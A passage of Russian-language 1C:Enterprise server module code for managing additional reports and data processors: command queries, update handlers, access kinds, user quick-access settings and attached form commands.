			|	НЕОПРЕДЕЛЕНО КАК Использование
			|ПОМЕСТИТЬ ИтоговаяТаблица
			|ИЗ
			|	втСсылки КАК ТаблицаСсылки
			|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.ДополнительныеОтчетыИОбработки.Команды КАК ТаблицаКоманды
			|		ПО ТаблицаСсылки.Ссылка = ТаблицаКоманды.Ссылка
			|			И (ТаблицаКоманды.Скрыть = ЛОЖЬ)
			|			И (ТаблицаКоманды.ВариантЗапуска В (&ТипыКоманд))"";
			
			Запрос.УстановитьПараметр(""СсылкаРодителя"", СсылкаРодителяИлиРаздела);
			
		КонецЕсли;
		
	Иначе
		
		ТекстЗапроса =
		""ВЫБРАТЬ РАЗРЕШЕННЫЕ
		|	ТаблицаКоманды.Ссылка,
		|	ТаблицаКоманды.Идентификатор,
		|	ТаблицаКоманды.ЗаменяемыеКоманды,
		|	ТаблицаКоманды.ВариантЗапуска,
		|	ТаблицаКоманды.Представление КАК Представление,
		|	ТаблицаКоманды.ПоказыватьОповещение,
		|	ТаблицаКоманды.Модификатор,
		|	НЕОПРЕДЕЛЕНО КАК Использование
		|ПОМЕСТИТЬ ИтоговаяТаблица
		|ИЗ
		|	Справочник.ДополнительныеОтчетыИОбработки.Команды КАК ТаблицаКоманды
		|		ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.ДополнительныеОтчетыИОбработки КАК ДопОтчетыИОбработки
		|		ПО ТаблицаКоманды.Ссылка = ДопОтчетыИОбработки.Ссылка
		|			И (ДопОтчетыИОбработки.Вид = &Вид)
		|			И (ТаблицаКоманды.ВариантЗапуска В (&ТипыКоманд))
		|			И (ДопОтчетыИОбработки.Публикация = &Публикация)
		|			И (ДопОтчетыИОбработки.ПометкаУдаления = ЛОЖЬ)
		|			И (ДопОтчетыИОбработки.ИспользоватьДляФормыСписка = ИСТИНА)
		|			И (ДопОтчетыИОбработки.ИспользоватьДляФормыОбъекта = ИСТИНА)
		|			И (ТаблицаКоманды.Скрыть = ЛОЖЬ)"";
		
	КонецЕсли;
	
	// Отключение отборов по форме списка и объекта.
	Если ЭтоФормаОбъекта <> Истина Тогда
		ТекстЗапроса = СтрЗаменить(ТекстЗапроса, ""И (ДопОтчетыИОбработки.ИспользоватьДляФормыОбъекта = ИСТИНА)"", """");
	КонецЕсли;
	Если ЭтоФормаОбъекта <> Ложь Тогда
		ТекстЗапроса = СтрЗаменить(ТекстЗапроса, ""И (ДопОтчетыИОбработки.ИспользоватьДляФормыСписка = ИСТИНА)"", """");
	КонецЕсли;
	
	Если ТипыКоманд = Неопределено Тогда
		ТекстЗапроса = СтрЗаменить(ТекстЗапроса, ""И (ТаблицаКоманды.ВариантЗапуска В (&ТипыКоманд))"", """");
	Иначе
		Запрос.УстановитьПараметр(""ТипыКоманд"", ТипыКоманд);
	КонецЕсли;
	
	Запрос.УстановитьПараметр(""Вид"", ВидОбработок);
	Если ПравоДоступа(""Изменение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		ТекстЗапроса = СтрЗаменить(ТекстЗапроса, ""Публикация = &Публикация"", ""Публикация <> &Публикация"");
		Запрос.УстановитьПараметр(""Публикация"", Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.Отключена);
	Иначе
		Запрос.УстановитьПараметр(""Публикация"", Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется);
	КонецЕсли;
	Запрос.УстановитьПараметр(""ТекущийПользователь"", ПользователиКлиентСервер.АвторизованныйПользователь());
	Запрос.Текст = ТекстЗапроса;
	
	Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса() Тогда
		АдаптироватьЗапросПоДоступнымКомандамКМоделиСервиса(Запрос);
	Иначе
		Запрос.Текст = СтрЗаменить(Запрос.Текст, ""ПОМЕСТИТЬ ИтоговаяТаблица"", """");
		Запрос.Текст = Запрос.Текст + ""
		|
		|УПОРЯДОЧИТЬ ПО
		|	Представление"";
	КонецЕсли;
	
	Возврат Запрос;
КонецФункции

// Обработчик подключенной команды заполнения.
//
// Параметры
//   МассивСсылок - Массив - Массив ссылок выбранных объектов, для которых выполняется команда.
//   ПараметрыВыполнения - Структура - Контекст команды.
//       * ОписаниеКоманды - Структура - Сведения о выполняемой команде.
//          ** Идентификатор - Строка - Идентификатор команды.
//          ** Представление - Строка - Представление команды в форме.
//          ** Имя - Строка - Имя команды в форме.
//       * Форма - УправляемаяФорма - Форма, из которой была вызвана команда.
//       * Источник - ДанныеФормыСтруктура, ТаблицаФормы - Объект или список формы с полем ""Ссылка"".
//
Процедура ОбработчикКомандыЗаполнения(Знач МассивСсылок, Знач ПараметрыВыполнения) Экспорт
	ВыполняемаяКоманда = ПараметрыВыполнения.ОписаниеКоманды.ДополнительныеПараметры;
	
	ВнешнийОбъект = ОбъектВнешнейОбработки(ВыполняемаяКоманда.Ссылка);
	
	ПараметрыКоманды = Новый Структура;
	ПараметрыКоманды.Вставить(""ЭтаФорма"", ПараметрыВыполнения.Форма);
	ПараметрыКоманды.Вставить(""ДополнительнаяОбработкаСсылка"", ВыполняемаяКоманда.Ссылка);
	
	ВыполнитьКомандуВнешнегоОбъекта(ВнешнийОбъект, ВыполняемаяКоманда.Идентификатор, ПараметрыКоманды, Неопределено);
КонецПроцедуры

Функция ИспользуютсяДополнительныеОтчетыИОбработки() Экспорт
	Возврат ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"");
КонецФункции

////////////////////////////////////////////////////////////////////////////////
// Обработчики подписок на события.

// Удаление ссылок подсистем перед их удалением.
Процедура ПередУдалениемИдентификатораОбъектаМетаданных(ИОМОбъект, Отказ) Экспорт
	Если ИОМОбъект.ОбменДанными.Загрузка Тогда
		Возврат;
	КонецЕсли;
	
	ИОМСсылка = ИОМОбъект.Ссылка;
	
	ТекстЗапроса =
	""ВЫБРАТЬ РАЗЛИЧНЫЕ
	|	РазделыОтчетовИОбработок.Ссылка
	|ПОМЕСТИТЬ втСсылки
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки.Разделы КАК РазделыОтчетовИОбработок
	|ГДЕ
	|	РазделыОтчетовИОбработок.Раздел = &ИОМСсылка
	|
	|ОБЪЕДИНИТЬ ВСЕ
	|
	|ВЫБРАТЬ РАЗЛИЧНЫЕ
	|	РазделыОтчетовИОбработок.Ссылка
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки.Назначение КАК РазделыОтчетовИОбработок
	|ГДЕ
	|	РазделыОтчетовИОбработок.ОбъектНазначения = &ИОМСсылка
	|;
	|
	|////////////////////////////////////////////////////////////////////////////////
	|ВЫБРАТЬ РАЗЛИЧНЫЕ
	|	втСсылки.Ссылка
	|ИЗ
	|	втСсылки КАК втСсылки"";
	
	Запрос = Новый Запрос;
	Запрос.УстановитьПараметр(""ИОМСсылка"", ИОМСсылка);
	Запрос.Текст = ТекстЗапроса;
	
	Выборка = Запрос.Выполнить().Выбрать();
	Пока Выборка.Следующий() Цикл
		СправочникОбъект = Выборка.Ссылка.ПолучитьОбъект();
		
		Найденные = СправочникОбъект.Разделы.НайтиСтроки(Новый Структура(""Раздел"", ИОМСсылка));
		Для Каждого СтрокаТаблицы Из Найденные Цикл
			СправочникОбъект.Разделы.Удалить(СтрокаТаблицы);
		КонецЦикла;
		
		Найденные = СправочникОбъект.Назначение.НайтиСтроки(Новый Структура(""ОбъектНазначения"", ИОМСсылка));
		Для Каждого СтрокаТаблицы Из Найденные Цикл
			СправочникОбъект.Назначение.Удалить(СтрокаТаблицы);
		КонецЦикла;
		
		СправочникОбъект.Записать();
	КонецЦикла;
КонецПроцедуры

// Обновляет отчеты и обработки в справочнике из общих макетов.
//
// Параметры:
//   ОтчетыИОбработки - ТаблицаЗначений - Таблица отчетов и обработок в общих макетах.
//       * ОбъектМетаданных - ОбъектМетаданных - Отчет или обработка из конфигурации.
//       * СтарыеИменаОбъектов - Массив - Старые имена объектов для поиска старых версий этого отчета или обработки.
//           ** Строка - Старое имя объекта.
//       * СтарыеИменаФайлов - Массив - Старые имена файлов для поиска старых версий этого отчета или обработки.
//           ** Строка - Старое имя файла.
//
Процедура ЗагрузитьДополнительныеОтчетыИОбработкиИзМетаданных(ОтчетыИОбработки) Экспорт
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	
	СопоставитьОбработкиКонфигурацииСОбработкамиСправочника(ОтчетыИОбработки);
	Если ОтчетыИОбработки.Количество() = 0 Тогда
		Возврат; // Обновление не требуется.
	КонецЕсли;
	
	ВыгрузитьОтчетыИОбработкиВФайлы(ОтчетыИОбработки);
	Если ОтчетыИОбработки.Количество() = 0 Тогда
		Возврат; // Выгрузка провалилась.
	КонецЕсли;
	
	ЗарегистрироватьОтчетыИОбработки(ОтчетыИОбработки);
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Обработчики событий подсистем конфигурации.

// См. ОбновлениеИнформационнойБазыБСП.ПриДобавленииОбработчиковОбновления.
Процедура ПриДобавленииОбработчиковОбновления(Обработчики) Экспорт
	
	Обработчик = Обработчики.Добавить();
	Обработчик.Версия = ""1.0.7.1"";
	Обработчик.Процедура = ""ДополнительныеОтчетыИОбработки.ОбновитьПользовательскиеНастройкиДоступаКОбработкам"";
	
	Обработчик = Обработчики.Добавить();
	Обработчик.Версия = ""2.0.1.4"";
	Обработчик.Процедура = ""ДополнительныеОтчетыИОбработки.ЗаполнитьИменаОбъектов"";
	
	Обработчик = Обработчики.Добавить();
	Обработчик.Версия = ""2.1.3.2"";
	Обработчик.Процедура = ""ДополнительныеОтчетыИОбработки.ЗаменитьИменаОбъектовМетаданныхНаСсылки"";
	
	Если НЕ ОбщегоНазначения.РазделениеВключено() Тогда
		Обработчик = Обработчики.Добавить();
		Обработчик.ВыполнятьВГруппеОбязательных = Истина;
		Обработчик.ОбщиеДанные                  = Истина;
		Обработчик.УправлениеОбработчиками      = Ложь;
		Обработчик.МонопольныйРежим             = Истина;
		Обработчик.Версия    = ""2.1.3.22"";
		Обработчик.Процедура = ""ДополнительныеОтчетыИОбработки.ВключитьФункциональнуюОпцию"";
	КонецЕсли;
	
	Обработчик = Обработчики.Добавить();
	Обработчик.Версия = ""2.2.2.25"";
	Обработчик.Процедура = ""ДополнительныеОтчетыИОбработки.ЗаполнитьРежимСовместимостиРазрешений"";
	
КонецПроцедуры

// См. ОбщегоНазначенияПереопределяемый.ПриДобавленииПереименованийОбъектовМетаданных.
Процедура ПриДобавленииПереименованийОбъектовМетаданных(Итог) Экспорт
	
	Библиотека = ""СтандартныеПодсистемы"";
	
	ОбщегоНазначения.ДобавитьПереименование(
		Итог, ""2.3.3.3"", ""Роль.ИспользованиеДополнительныхОтчетовИОбработок"", ""Роль.ЧтениеДополнительныхОтчетовИОбработок"", Библиотека);
	
КонецПроцедуры

// См. СтандартныеПодсистемыСервер.ПриПолученииДанныхОтПодчиненного.
Процедура ПриПолученииДанныхОтПодчиненного(ЭлементДанных, ПолучениеЭлемента, ОтправкаНазад, Отправитель) Экспорт
	
	ПриПолученииДополнительнойОбработки(ЭлементДанных, ПолучениеЭлемента);
	
КонецПроцедуры

// См. СтандартныеПодсистемыСервер.ПриПолученииДанныхОтГлавного.
Процедура ПриПолученииДанныхОтГлавного(ЭлементДанных, ПолучениеЭлемента, ОтправкаНазад, Отправитель) Экспорт
	
	ПриПолученииДополнительнойОбработки(ЭлементДанных, ПолучениеЭлемента);
	
КонецПроцедуры

// См. ТекущиеДелаПереопределяемый.ПриОпределенииОбработчиковТекущихДел.
Процедура ПриЗаполненииСпискаТекущихДел(ТекущиеДела) Экспорт
	Если ОбщегоНазначения.РазделениеВключено()
		Или Не ПравоДоступа(""Редактирование"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки)
		Или Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	
	МодульТекущиеДелаСервер = ОбщегоНазначения.ОбщийМодуль(""ТекущиеДелаСервер"");
	Если МодульТекущиеДелаСервер.ДелоОтключено(""ДополнительныеОтчетыИОбработки"") Тогда
		Возврат; // Дело отключено в переопределяемом модуле.
	КонецЕсли;
	
	Подсистема = Метаданные.Подсистемы.Найти(""Администрирование"");
	Если Подсистема = Неопределено
		Или Не ПравоДоступа(""Просмотр"", Подсистема)
		Или Не ОбщегоНазначения.ОбъектМетаданныхДоступенПоФункциональнымОпциям(Подсистема) Тогда
		Разделы = МодульТекущиеДелаСервер.РазделыДляОбъекта(""Справочник.ДополнительныеОтчетыИОбработки"");
	Иначе
		Разделы = Новый Массив;
		Разделы.Добавить(Подсистема);
	КонецЕсли;
	
	ВывестиДело = Истина;
	ПровереноНаВерсию = ХранилищеОбщихНастроек.Загрузить(""ТекущиеДела"", ""ДополнительныеОтчетыИОбработки"");
	Если ПровереноНаВерсию <> Неопределено Тогда
		ВерсияМассив  = СтрРазделить(Метаданные.Версия, ""."", Истина);
		ТекущаяВерсия = ВерсияМассив[0] + ВерсияМассив[1] + ВерсияМассив[2];
		Если ПровереноНаВерсию = ТекущаяВерсия Тогда
			ВывестиДело = Ложь; // Дополнительные отчеты и обработки проверены на текущей версии.
		КонецЕсли;
	КонецЕсли;
	
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ РАЗРЕШЕННЫЕ
	|	КОЛИЧЕСТВО(РАЗЛИЧНЫЕ ДополнительныеОтчетыИОбработки.Ссылка) КАК Количество
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК ДополнительныеОтчетыИОбработки
	|ГДЕ
	|	ДополнительныеОтчетыИОбработки.Публикация = ЗНАЧЕНИЕ(Перечисление.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется)
	|	И ДополнительныеОтчетыИОбработки.ПометкаУдаления = ЛОЖЬ
	|	И ДополнительныеОтчетыИОбработки.ЭтоГруппа = ЛОЖЬ"";
	Количество = Запрос.Выполнить().Выгрузить()[0].Количество;
	
	Для Каждого Раздел Из Разделы Цикл
		ИдентификаторРаздела = ""ПроверитьСовместимостьСТекущейВерсией"" + СтрЗаменить(Раздел.ПолноеИмя(), ""."", """");
		
		Дело = ТекущиеДела.Добавить();
		Дело.Идентификатор = ""ДополнительныеОтчетыИОбработки"";
		Дело.ЕстьДела      = ВывестиДело И Количество > 0;
		Дело.Представление = НСтр(""ru = 'Дополнительные отчеты и обработки'"");
		Дело.Количество    = Количество;
		Дело.Форма         = ""Справочник.ДополнительныеОтчетыИОбработки.Форма.ПроверкаДополнительныхОтчетовИОбработок"";
		Дело.Владелец      = ИдентификаторРаздела;
		
		// Проверка наличия группы дела. Если группа отсутствует - добавляем.
		ГруппаДела = ТекущиеДела.Найти(ИдентификаторРаздела, ""Идентификатор"");
		Если ГруппаДела = Неопределено Тогда
			ГруппаДела = ТекущиеДела.Добавить();
			ГруппаДела.Идентификатор = ИдентификаторРаздела;
			ГруппаДела.ЕстьДела      = Дело.ЕстьДела;
			ГруппаДела.Представление = НСтр(""ru = 'Проверить совместимость'"");
			Если Дело.ЕстьДела Тогда
				ГруппаДела.Количество = Дело.Количество;
			КонецЕсли;
			ГруппаДела.Владелец = Раздел;
		Иначе
			Если Не ГруппаДела.ЕстьДела Тогда
				ГруппаДела.ЕстьДела = Дело.ЕстьДела;
			КонецЕсли;
			
			Если Дело.ЕстьДела Тогда
				ГруппаДела.Количество = ГруппаДела.Количество + Дело.Количество;
			КонецЕсли;
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры

// См. УправлениеДоступомПереопределяемый.ПриЗаполненииВидовДоступа.
Процедура ПриЗаполненииВидовДоступа(ВидыДоступа) Экспорт
	
	ВидДоступа = ВидыДоступа.Добавить();
	ВидДоступа.Имя = ""ДополнительныеОтчетыИОбработки"";
	ВидДоступа.Представление = НСтр(""ru = 'Дополнительные отчеты и обработки'"");
	ВидДоступа.ТипЗначений   = Тип(""СправочникСсылка.ДополнительныеОтчетыИОбработки"");
	
КонецПроцедуры

// См. УправлениеДоступомПереопределяемый.ПриЗаполненииИспользованияВидаДоступа.
Процедура ПриЗаполненииИспользованияВидаДоступа(ВидДоступа, Использование) Экспорт
	
	УстановитьПривилегированныйРежим(Истина);
	
	Если ВидДоступа = ""ДополнительныеОтчетыИОбработки"" Тогда
		Использование = Константы.ИспользоватьДополнительныеОтчетыИОбработки.Получить();
	КонецЕсли;
	
КонецПроцедуры

// См. УправлениеДоступомПереопределяемый.ПриЗаполненииВидовОграниченийПравОбъектовМетаданных.
Процедура ПриЗаполненииВидовОграниченийПравОбъектовМетаданных(Описание) Экспорт
	
	Если НЕ ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.УправлениеДоступом"") Тогда
		Возврат;
	КонецЕсли;
	
	МодульУправлениеДоступомСлужебный = ОбщегоНазначения.ОбщийМодуль(""УправлениеДоступомСлужебный"");
	Если МодульУправлениеДоступомСлужебный.ВидДоступаСуществует(""ДополнительныеОтчетыИОбработки"") Тогда
		
		Описание = Описание + ""
		|
		|Справочник.ДополнительныеОтчетыИОбработки.Чтение.ДополнительныеОтчетыИОбработки
		|"";
	КонецЕсли;
	
КонецПроцедуры

// См. ПользователиПереопределяемый.ПриОпределенииНазначенияРолей.
Процедура ПриОпределенииНазначенияРолей(НазначениеРолей) Экспорт
	
	// СовместноДляПользователейИВнешнихПользователей.
	НазначениеРолей.СовместноДляПользователейИВнешнихПользователей.Добавить(
		Метаданные.Роли.ЧтениеДополнительныхОтчетовИОбработок.Имя);
	
КонецПроцедуры

// См. ПользователиПереопределяемый.ПриПолученииПрочихНастроек.
Процедура ПриПолученииПрочихНастроек(СведенияОПользователе, Настройки) Экспорт
	
	// Получает настройки дополнительных отчетов и обработок для переданного пользователя.
	
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"")
		Или Не ПравоДоступа(""Изменение"", Метаданные.РегистрыСведений.ПользовательскиеНастройкиДоступаКОбработкам) Тогда
		Возврат;
	КонецЕсли;
	
	// Название строки настроек, отображаемое в дереве настроек обработки.
	НазваниеНастройки = НСтр(""ru = 'Настройки быстрого доступа к дополнительным отчетам и обработкам'"");
	
	// Картинка строки настроек
	КартинкаНастройки = """";
	
	// Список дополнительных отчетов и обработок, находящихся в быстром доступе у пользователя.
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ
	|	ПользовательскиеНастройкиДоступаКОбработкам.ДополнительныйОтчетИлиОбработка КАК Объект,
	|	ПользовательскиеНастройкиДоступаКОбработкам.ИдентификаторКоманды КАК Идентификатор,
	|	ПользовательскиеНастройкиДоступаКОбработкам.Пользователь КАК Пользователь
	|ИЗ
	|	РегистрСведений.ПользовательскиеНастройкиДоступаКОбработкам КАК ПользовательскиеНастройкиДоступаКОбработкам
	|ГДЕ
	|	Пользователь = &Пользователь"";
	
	Запрос.Параметры.Вставить(""Пользователь"", СведенияОПользователе.ПользовательСсылка);
	
	РезультатЗапроса = Запрос.Выполнить().Выгрузить();
	
	НастройкаБыстрогоДоступа = Новый Структура;
	НастройкаБыстрогоДоступа.Вставить(""НазваниеНастройки"", НазваниеНастройки);
	НастройкаБыстрогоДоступа.Вставить(""КартинкаНастройки"", КартинкаНастройки);
	НастройкаБыстрогоДоступа.Вставить(""СписокНастроек"",    РезультатЗапроса);
	
	Настройки.Вставить(""НастройкаБыстрогоДоступа"", НастройкаБыстрогоДоступа);
	
КонецПроцедуры

// См. ПользователиПереопределяемый.ПриСохраненииПрочихНастроек.
Процедура ПриСохраненииПрочихНастроек(СведенияОПользователе, Настройки) Экспорт
	
	// Сохраняет команды дополнительных отчетов и обработок указанным пользователям.
	
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	
	Если Настройки.ИдентификаторНастройки <> ""НастройкаБыстрогоДоступа"" Тогда
		Возврат;
	КонецЕсли;
	
	Для Каждого ЭлементСтрока Из Настройки.ЗначениеНастройки Цикл
		
		Запись = РегистрыСведений.ПользовательскиеНастройкиДоступаКОбработкам.СоздатьМенеджерЗаписи();
		
		Запись.ДополнительныйОтчетИлиОбработка  = ЭлементСтрока.Значение;
		Запись.ИдентификаторКоманды             = ЭлементСтрока.Представление;
		Запись.Пользователь                     = СведенияОПользователе.ПользовательСсылка;
		Запись.Доступно                         = Истина;
		
		Запись.Записать(Истина);
		
	КонецЦикла;
	
КонецПроцедуры

// См. ПользователиПереопределяемый.ПриУдаленииПрочихНастроек.
Процедура ПриУдаленииПрочихНастроек(СведенияОПользователе, Настройки) Экспорт
	
	// Очищает команды дополнительных отчетов и обработок у указанного пользователя.
	
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	
	Если Настройки.ИдентификаторНастройки <> ""НастройкаБыстрогоДоступа"" Тогда
		Возврат;
	КонецЕсли;
	
	Для Каждого ЭлементСтрока Из Настройки.ЗначениеНастройки Цикл
		
		Запись = РегистрыСведений.ПользовательскиеНастройкиДоступаКОбработкам.СоздатьМенеджерЗаписи();
		
		Запись.ДополнительныйОтчетИлиОбработка  = ЭлементСтрока.Значение;
		Запись.ИдентификаторКоманды             = ЭлементСтрока.Представление;
		Запись.Пользователь                     = СведенияОПользователе.ПользовательСсылка;
		
		Запись.Прочитать();
		
		Запись.Удалить();
		
	КонецЦикла;
	
КонецПроцедуры

// См. ГрупповоеИзменениеОбъектовПереопределяемый.ПриОпределенииОбъектовСРедактируемымиРеквизитами.
Процедура ПриОпределенииОбъектовСРедактируемымиРеквизитами(Объекты) Экспорт
	Объекты.Вставить(Метаданные.Справочники.ДополнительныеОтчетыИОбработки.ПолноеИмя(), ""РеквизитыРедактируемыеВГрупповойОбработке"");
КонецПроцедуры

// См. ПодключаемыеКомандыПереопределяемый.ПриОпределенииВидовПодключаемыхКоманд.
Процедура ПриОпределенииВидовПодключаемыхКоманд(ВидыПодключаемыхКоманд) Экспорт
	Если ВидыПодключаемыхКоманд.Найти(""ЗаполнениеОбъектов"", ""Имя"") = Неопределено Тогда
		Вид = ВидыПодключаемыхКоманд.Добавить();
		Вид.Имя         = ""ЗаполнениеОбъектов"";
		Вид.ИмяПодменю  = ""ПодменюЗаполнить"";
		Вид.Заголовок   = НСтр(""ru = 'Заполнить'"");
		Вид.Картинка    = БиблиотекаКартинок.ЗаполнитьФорму;
		Вид.Отображение = ОтображениеКнопки.Картинка;
	КонецЕсли;
КонецПроцедуры

// См. ПодключаемыеКомандыПереопределяемый.ПриОпределенииКомандПодключенныхКОбъекту.
Процедура ПриОпределенииКомандПодключенныхКОбъекту(НастройкиФормы, Источники, ПодключенныеОтчетыИОбработки, Команды) Экспорт
	
	Если Не ПравоДоступа(""Чтение"", Метаданные.РегистрыСведений.НазначениеДополнительныхОбработок) Тогда 
		Возврат;
	КонецЕсли;
	
	Если НастройкиФормы.ЭтоФормаОбъекта Тогда
		ТипФормы = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипФормыОбъекта();
	Иначе
		ТипФормы = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипФормыСписка();
	КонецЕсли;
	
	УстанавливатьПараметрыФО = (Метаданные.ОбщиеКоманды.Найти(""СозданиеСвязанныхОбъектов"") <> Неопределено);
	Если УстанавливатьПараметрыФО Тогда
		НастройкиФормы.ФункциональныеОпции.Вставить(""ДополнительныеОтчетыИОбработкиОбъектНазначения"", Справочники.ИдентификаторыОбъектовМетаданных.ПустаяСсылка());
		НастройкиФормы.ФункциональныеОпции.Вставить(""ДополнительныеОтчетыИОбработкиТипФормы"",         ТипФормы);
	КонецЕсли;
	
	Если Не ПолучитьФункциональнуюОпцию(""ИспользоватьДополнительныеОтчетыИОбработки"") Тогда
		Возврат;
	КонецЕсли;
	
	ИОМы = Новый Массив;
	БыстрыйПоискПоИОМам = Новый Соответствие;
	Для Каждого Источник Из Источники.Строки Цикл
		Для Каждого ДокументРегистратор Из Источник.Строки Цикл
			ИОМы.Добавить(ДокументРегистратор.СсылкаМетаданных);
			БыстрыйПоискПоИОМам.Вставить(ДокументРегистратор.СсылкаМетаданных, ДокументРегистратор);
		КонецЦикла;
		ИОМы.Добавить(Источник.СсылкаМетаданных);
		БыстрыйПоискПоИОМам.Вставить(Источник.СсылкаМетаданных, Источник);
	КонецЦикла;
	
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ
	|	Назначение.ОбъектНазначения,
	|	Назначение.ИспользоватьЗаполнениеОбъекта КАК ИспользоватьЗаполнениеОбъекта,
	|	Назначение.ИспользоватьОтчеты КАК ИспользоватьОтчеты,
	|	Назначение.ИспользоватьСозданиеСвязанныхОбъектов КАК ИспользоватьСозданиеСвязанныхОбъектов
	|ИЗ
	|	РегистрСведений.НазначениеДополнительныхОбработок КАК Назначение
	|ГДЕ
	|	Назначение.ОбъектНазначения В(&ИОМы)
	|	И Назначение.ТипФормы = &ТипФормы"";
	Запрос.УстановитьПараметр(""ИОМы"", ИОМы);
	Если ТипФормы = Неопределено Тогда
		Запрос.Текст = СтрЗаменить(Запрос.Текст, ""И Назначение.ТипФормы = &ТипФормы"", """");
	Иначе
		Запрос.УстановитьПараметр(""ТипФормы"", ТипФормы);
	КонецЕсли;
	
	ТипыЗаполнениеОбъекта = Новый Массив;
	ТипыОтчетов = Новый Массив;
	ТипыСозданияСвязанныхОбъектов = Новый Массив;
	
	ТаблицаРегистра = Запрос.Выполнить().Выгрузить();
	Для Каждого СтрокаТаблицы Из ТаблицаРегистра Цикл
		Источник = БыстрыйПоискПоИОМам[СтрокаТаблицы.ОбъектНазначения];
		Если Источник = Неопределено Тогда
			Продолжить;
		КонецЕсли;
		Если СтрокаТаблицы.ИспользоватьЗаполнениеОбъекта Тогда
			ПодключаемыеКоманды.ДополнитьМассивТипов(ТипыЗаполнениеОбъекта, Источник.ТипСсылкиДанных);
		КонецЕсли;
		Если СтрокаТаблицы.ИспользоватьОтчеты Тогда
			ПодключаемыеКоманды.ДополнитьМассивТипов(ТипыОтчетов, Источник.ТипСсылкиДанных);
		КонецЕсли;
		Если СтрокаТаблицы.ИспользоватьСозданиеСвязанныхОбъектов Тогда
			ПодключаемыеКоманды.ДополнитьМассивТипов(ТипыСозданияСвязанныхОбъектов, Источник.ТипСсылкиДанных);
		КонецЕсли;
	КонецЦикла;
	
	Если ТипыЗаполнениеОбъекта.Количество() > 0 Тогда
		Команда = Команды.Добавить();
		Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.ЗаполнениеОбъектов"") Тогда
			Команда.Вид           = ""ЗаполнениеОбъектов"";
			Команда.Представление = НСтр(""ru = 'Дополнительные обработки заполнения...'"");
			Команда.Важность      = ""СмТакже"";
		Иначе
			Команда.Вид           = ""КоманднаяПанель"";
			Команда.Представление = НСтр(""ru = 'Заполнение...'"");
		КонецЕсли;
		Команда.ИзменяетВыбранныеОбъекты = Истина;
		Команда.Порядок            = 50;
		Команда.Обработчик         = ""ДополнительныеОтчетыИОбработкиКлиент.ОткрытьСписокКоманд"";
		Команда.РежимЗаписи        = ""Записывать"";
		Команда.МножественныйВыбор = Истина;
		Команда.ТипПараметра       = Новый ОписаниеТипов(ТипыЗаполнениеОбъекта);
		Команда.ДополнительныеПараметры = Новый Структура(""Вид, ЭтоОтчет"", ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиЗаполнениеОбъекта(), Ложь);
	ИначеЕсли НастройкиФормы.ЭтоФормаОбъекта Тогда
		ПриОпределенииКомандЗаполненияПодключенныхКОбъекту(Команды, ИОМы, БыстрыйПоискПоИОМам);
	КонецЕсли;
	
	Если ТипыОтчетов.Количество() > 0 Тогда
		Команда = Команды.Добавить();
		Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.ВариантыОтчетов"") Тогда
			Команда.Вид           = ""Отчеты"";
			Команда.Важность      = ""СмТакже"";
			Команда.Представление = НСтр(""ru = 'Дополнительные отчеты...'"");
		Иначе
			Команда.Вид           = ""КоманднаяПанель"";
			Команда.Представление = НСтр(""ru = 'Отчеты...'"");
		КонецЕсли;
		Команда.Порядок            = 50;
		Команда.Обработчик         = ""ДополнительныеОтчетыИОбработкиКлиент.ОткрытьСписокКоманд"";
		Команда.РежимЗаписи        = ""Записывать"";
		Команда.МножественныйВыбор = Истина;
		Команда.ТипПараметра       = Новый ОписаниеТипов(ТипыОтчетов);
		Команда.ДополнительныеПараметры = Новый Структура(""Вид, ЭтоОтчет"", ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиОтчет(), Истина);
	КонецЕсли;
	
	Если ТипыСозданияСвязанныхОбъектов.Количество() > 0 Тогда
		Если УстанавливатьПараметрыФО И ИОМы.Количество() = 1 Тогда
			НастройкиФормы.ФункциональныеОпции.Вставить(""ДополнительныеОтчетыИОбработкиОбъектНазначения"", ИОМы[0]);
		Иначе
			Команда = Команды.Добавить();
			Команда.Вид                = ?(УстанавливатьПараметрыФО, ""КоманднаяПанель"", ""СозданиеНаОсновании"");
			Команда.Представление      = НСтр(""ru = 'Создание связанных объектов...'"");
			Команда.Картинка           = БиблиотекаКартинок.ВводНаОсновании;
			Команда.Порядок            = 50;
			Команда.Обработчик         = ""ДополнительныеОтчетыИОбработкиКлиент.ОткрытьСписокКоманд"";
			Команда.РежимЗаписи        = ""Записывать"";
			Команда.МножественныйВыбор = Истина;
			Команда.ТипПараметра       = Новый ОписаниеТипов(ТипыСозданияСвязанныхОбъектов);
